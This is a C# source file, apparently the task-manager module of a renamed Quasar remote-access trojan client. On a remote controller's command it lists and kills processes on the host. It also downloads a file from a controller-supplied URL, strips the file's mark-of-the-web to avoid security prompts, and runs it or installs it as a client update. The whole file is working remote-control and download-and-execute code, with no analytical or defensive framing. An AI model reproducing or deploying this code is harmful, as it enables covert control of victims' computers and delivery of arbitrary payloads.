

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Threading;
using InvokedClient.Networking;
using InvokedClient.Setup;
using InvokedCommon;
using InvokedCommon.Enums;
using InvokedCommon.Helpers;
using InvokedCommon.Messages;
using InvokedCommon.Networking;


namespace InvokedClient.MessageHandlers
{
	public class TaskManagerHandler : IMessageProcessor, IDisposable
	{
		private readonly QuasarClient _client;
		private readonly WebClient _webClient;

		public TaskManagerHandler(QuasarClient client)
		{
			this._client = client;
			this._client.ClientState += new Client.ClientStateEventHandler(this.OnClientStateChange);
			this._webClient = new WebClient()
			{
				Proxy = (IWebProxy)null
			};
			this._webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(this.OnDownloadFileCompleted);
		}

		private void OnClientStateChange(Client s, bool connected)
		{
			if (connected || !this._webClient.IsBusy)
				return;
			this._webClient.CancelAsync();
		}

		public bool CanExecute(IMessage message)
		{
			switch (message)
			{
				case GetProcesses _:
				case DoProcessStart _:
					return true;
				default:
					return message is DoProcessEnd;
			}
		}

		public bool CanExecuteFrom(ISender sender) => this._client.Equals((object)sender);

		public void Execute(ISender sender, IMessage message)
		{
			switch (message)
			{
				case GetProcesses message1:
					this.Execute(sender, message1);
					break;
				case DoProcessStart message2:
					this.Execute(sender, message2);
					break;
				case DoProcessEnd message3:
					this.Execute(sender, message3);
					break;
			}
		}

		private void Execute(ISender client, GetProcesses message)
		{
			System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcesses();
			InvokedCommon.Models.Process[] processArray = new InvokedCommon.Models.Process[processes.Length];
			for (int index = 0; index < processes.Length; ++index)
			{
				InvokedCommon.Models.Process process = new InvokedCommon.Models.Process()
				{
					Name = processes[index].ProcessName + ".exe",
					Id = processes[index].Id,
					MainWindowTitle = processes[index].MainWindowTitle
				};
				processArray[index] = process;
			}
			client.Send<GetProcessesResponse>(new GetProcessesResponse()
			{
				Processes = processArray
			});
		}

		private void Execute(ISender client, DoProcessStart message)
		{
			if (string.IsNullOrEmpty(message.FilePath))
			{
				if (string.IsNullOrEmpty(message.DownloadUrl))
				{
					client.Send<DoProcessResponse>(new DoProcessResponse()
					{
						Action = ProcessAction.Start,
						Result = false
					});
				}
				else
				{
					message.FilePath = message.fileExtension == null ? FileHelper.GetTempFilePath(".exe") : FileHelper.GetTempFilePath("." + message.fileExtension);
					try
					{
						if (this._webClient.IsBusy)
						{
							this._webClient.CancelAsync();
							while (this._webClient.IsBusy)
								Thread.Sleep(50);
						}
						this._webClient.DownloadFileAsync(new Uri(message.DownloadUrl), message.FilePath, (object)message);
					}
					catch
					{
						client.Send<DoProcessResponse>(new DoProcessResponse()
						{
							Action = ProcessAction.Start,
							Result = false
						});
						NativeMethods.DeleteFile(message.FilePath);
					}
				}
			}
			else
				this.ExecuteProcess(message.FilePath, message.IsUpdate);
		}

		private void OnDownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
		{
			DoProcessStart userState = (DoProcessStart)e.UserState;
			if (e.Cancelled)
			{
				NativeMethods.DeleteFile(userState.FilePath);
			}
			else
			{
				FileHelper.DeleteZoneIdentifier(userState.FilePath);
				this.ExecuteProcess(userState.FilePath, userState.IsUpdate);
			}
		}

		private void ExecuteProcess(string filePath, bool isUpdate)
		{
			if (isUpdate)
			{
				try
				{
					new ClientUpdater().Update(filePath);
					this._client.Exit();
				}
				catch (Exception ex)
				{
					NativeMethods.DeleteFile(filePath);
					this._client.Send<SetStatus>(new SetStatus()
					{
						Message = "Update failed: " + ex.Message
					});
				}
			}
			else
			{
				try
				{
					System.Diagnostics.Process.Start(new ProcessStartInfo()
					{
						UseShellExecute = true,
						FileName = filePath
					});
					this._client.Send<DoProcessResponse>(new DoProcessResponse()
					{
						Action = ProcessAction.Start,
						Result = true
					});
				}
				catch (Exception ex)
				{
					this._client.Send<DoProcessResponse>(new DoProcessResponse()
					{
						Action = ProcessAction.Start,
						Result = false
					});
				}
			}
		}

		private void Execute(ISender client, DoProcessEnd message)
		{
			try
			{
				System.Diagnostics.Process.GetProcessById(message.Pid).Kill();
				client.Send<DoProcessResponse>(new DoProcessResponse()
				{
					Action = ProcessAction.End,
					Result = true
				});
			}
			catch
			{
				client.Send<DoProcessResponse>(new DoProcessResponse()
				{
					Action = ProcessAction.End,
					Result = false
				});
			}
		}

		public void Dispose()
		{
			this.Dispose(true);
			GC.SuppressFinalize((object)this);
		}

		protected virtual void Dispose(bool disposing)
		{
			if (!disposing)
				return;
			this._client.ClientState -= new Client.ClientStateEventHandler(this.OnClientStateChange);
			this._webClient.DownloadFileCompleted -= new AsyncCompletedEventHandler(this.OnDownloadFileCompleted);
			this._webClient.CancelAsync();
			this._webClient.Dispose();
		}
	}
}